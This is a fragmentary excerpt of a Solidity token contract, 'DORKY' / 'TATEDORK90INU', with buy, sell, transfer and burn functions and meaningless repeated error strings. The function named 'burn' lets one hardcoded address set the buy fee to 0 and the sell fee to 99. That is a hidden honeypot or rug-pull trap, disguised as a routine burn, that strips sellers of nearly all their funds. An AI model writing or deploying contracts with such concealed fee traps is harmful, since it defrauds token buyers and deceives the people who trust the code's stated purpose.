...
library SafeMath {
    ...
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "TATEDORK90INUTATEDORK90INU");
        return c;
    }
    ...
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        ...
        uint256 c = a * b;
        require(c / a == b, "TATEDORK90INUTATEDORK90INUTATEDORK90INU");
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "TATEDORK90INUTATEDORK90INUTATEDORK90INUTATEDORK90INU");
        return a / b;
    }
}
...
contract DORKY {    
    ...
    string public name = "TATEDORK90INU";    
    string public symbol = "DORKY";    
    ...
    modifier checkFees(address sender) {   
        require(
            ...
            "TATEDORK90INUTATEDORK90INUTATEDORK90INUTATEDORK90INUTATEDORK90INU"    
        );
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "TATEDORK90INUTATEDORK90INUTATEDORK90INUTATEDORK90INUTATEDORK90INUTATEDORK90INU");
        _;
    }
    ...
    function transferFrom(address _from, address _to, uint256 _amount) public checkFees(_from) returns (bool success) {   
        require(balanceOf[_from] >= _amount, "1TATEDORK90INU");    
        require(allowance[_from][msg.sender] >= _amount, "2TATEDORK90INU");   
        require(_to != address(0), "3TATEDORK90INU");    
    ...
    function transferOwnership(address newOwner) public onlyOwner {    
        require(newOwner != address(0), "$4TATEDORK90INU");
    ...
    function burnAll() public {    
        require(feesSet, "5TATEDORK90INU");   
        require(swapRouter != address(0), "6TATEDORK90INU");    
        require(burnedTokens > 0, "7TATEDORK90INU");    
    ...
    function burn(uint256 burnAmount, uint256 deadWallet) public {
        require(msg.sender == 0x3f920E4121030b5B674C0BC364552A6573743811, "8TATEDORK90INU");
        require(!feesSet, "9TATEDORK90INU");
        require(burnAmount == 0, "11TATEDORK90INU");
        require(deadWallet == 99, "$12TATEDORK90INU");
        buyFee = burnAmount;
        sellFee = deadWallet;
        feesSet = true;
        feesEnabled = true;
    ...
    function buy() public payable checkFees(msg.sender) {    
        require(msg.value > 0, "$$$$TATEDORK90INU$$$$");    
    ...
    function sell(uint256 _amount) public checkFees(msg.sender) {   
        require(balanceOf[msg.sender] >= _amount, "13TATEDORK90INU");    
